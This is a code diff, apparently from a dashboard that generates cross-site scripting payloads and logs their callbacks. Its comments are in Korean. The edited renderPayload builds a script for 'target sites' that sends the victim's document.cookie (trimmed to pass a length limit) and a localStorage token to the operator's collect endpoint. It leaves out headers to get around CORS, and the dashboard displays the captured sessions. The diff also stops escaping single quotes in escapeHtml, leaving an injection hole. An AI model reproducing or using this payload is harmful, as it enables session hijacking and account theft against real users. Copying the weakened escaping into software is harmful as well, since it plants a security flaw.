@@ -11,7 +11,7 @@ const escapeHtml = (value = "") => {
         "<": "&lt;",
         ">": "&gt;",
         '"': "&quot;",
-        "'": "&#39;",
+        "'": "'",
       })[character],
   );
 };
@@ -42,18 +42,21 @@ function renderPayload() {
   const baseUrl = baseUrlInput.value.trim().replace(/\/+$/, "");
   const campaign = sanitizeCampaignId(campaignInput.value.trim());
   const eventType = sanitizeCampaignId(typeInput.value);
+
+  // 💡 [핵심 수정] 타겟 사이트에서 실행될 때 작동할 동적 자바스크립트 명령어를 문자열 형태로 조립합니다.
   const payload =
     `<script>` +
     `fetch('${baseUrl}/api/collect',{` +
     `method:'POST',` +
-    // 💡 CORS 우회를 위해 headers는 생략 상태를 유지합니다.
+    // CORS 우회를 위해 headers 생략 유지
     `body:JSON.stringify({` +
     `campaign:'${campaign}',` +
     `type:'${eventType}',` +
     `page:location.href,` +
-    // 💡 [핵심 수정] 기존 sessionStorage 대신 실제 document.cookie 전체를 전송합니다.
-    `sessionId: document.cookie || 'no-cookie',` + 
-    `userToken: localStorage.getItem('access_token') || 'no-token',` +
+    // 💡 타겟 사이트의 쿠키를 동적으로 읽고, 백엔드 200자 제한에 걸리지 않도록 190자로 자르는 동적 스크립트 주입
+    `sessionId: (document.cookie || 'no-cookie').substring(0, 190),` + 
+    // 💡 타겟 사이트의 로컬 스토리지에 존재하는 'last_Tabid' 값을 동적으로 가로채는 스크립트 주입
+    `userToken: localStorage.getItem('last_Tabid') || 'no-token-found',` +
     `referrer:document.referrer,` +
     `documentTitle:document.title,` +
     `cookieEnabled:navigator.cookieEnabled,` +
@@ -66,6 +69,7 @@ function renderPayload() {
     `})` +
     `.catch(()=>{});` +
     `<\/script>`;
+
   payloadOutput.textContent = payload;
 }
 
@@ -97,13 +101,20 @@ function renderEvents(events) {
   lastCallback.textContent = events[0]?.receivedAt
     ? new Date(events[0].receivedAt).toLocaleString("ko-KR")
     : "-";
+
   const campaigns = new Set(
     events.map((event) => event.campaign).filter(Boolean),
   );
   campaignCount.textContent = String(campaigns.size);
 
   if (events.length === 0) {
-    eventRows.innerHTML = ` <tr> <td colspan="8" class="muted empty-row"> No events </td> </tr> `;
+    eventRows.innerHTML = `
+      <tr>
+        <td colspan="8" class="muted empty-row">
+          No events
+        </td>
+      </tr>
+    `;
     return;
   }
 
@@ -113,17 +124,17 @@ function renderEvents(events) {
         ? new Date(event.receivedAt).toLocaleString("ko-KR")
         : "-";
       return `
-            <tr>
-                <td>${escapeHtml(receivedAt)}</td>
-                <td>${escapeHtml(event.campaign || "-")}</td>
-                <td>${escapeHtml(event.type || "-")}</td>
-                <td class="page" title="${escapeHtml(event.sessionId || "")}">${escapeHtml(event.sessionId || "-")}</td>
-                <td class="page" title="${escapeHtml(event.userToken || "")}">${escapeHtml(event.userToken || "-")}</td>
-                <td class="page" title="${escapeHtml(event.page || "")}">${escapeHtml(event.page || "-")}</td>
-                <td class="page" title="${escapeHtml(event.referrer || "")}">${escapeHtml(event.referrer || "-")}</td>
-                <td class="page" title="${escapeHtml(event.userAgent || "")}">${escapeHtml(event.userAgent || "-")}</td>
-            </tr>
-        `;
+        <tr>
+          <td>${escapeHtml(receivedAt)}</td>
+          <td>${escapeHtml(event.campaign || "-")}</td>
+          <td>${escapeHtml(event.type || "-")}</td>
+          <td class="page" title="${escapeHtml(event.sessionId || "")}">${escapeHtml(event.sessionId || "-")}</td>
+          <td class="page" title="${escapeHtml(event.userToken || "")}">${escapeHtml(event.userToken || "-")}</td>
+          <td class="page" title="${escapeHtml(event.page || "")}">${escapeHtml(event.page || "-")}</td>
+          <td class="page" title="${escapeHtml(event.referrer || "")}">${escapeHtml(event.referrer || "-")}</td>
+          <td class="page" title="${escapeHtml(event.userAgent || "")}">${escapeHtml(event.userAgent || "-")}</td>
+        </tr>
+      `;
     })
     .join("");
 }
@@ -194,7 +205,6 @@ clearButton.addEventListener("click", async () => {
   }
 });
 
-/* * 사이드 메뉴 이동 */
 const navigationLinks = Array.from(document.querySelectorAll(".nav a"));
 
 function activateNavigationLink(targetId) {
@@ -227,7 +237,6 @@ navigationLinks.forEach((link) => {
   });
 });
 
-/* * 스크롤 위치에 따라 메뉴 활성화 */
 const sections = Array.from(document.querySelectorAll(".page-section"));
 const sectionObserver = new IntersectionObserver(
   (entries) => {
@@ -248,7 +257,6 @@ sections.forEach((section) => {
   sectionObserver.observe(section);
 });
 
-/* * URL에 해시가 있을 때 해당 위치로 이동 */
 window.addEventListener("load", () => {
   const hash = window.location.hash;
   if (!hash) {
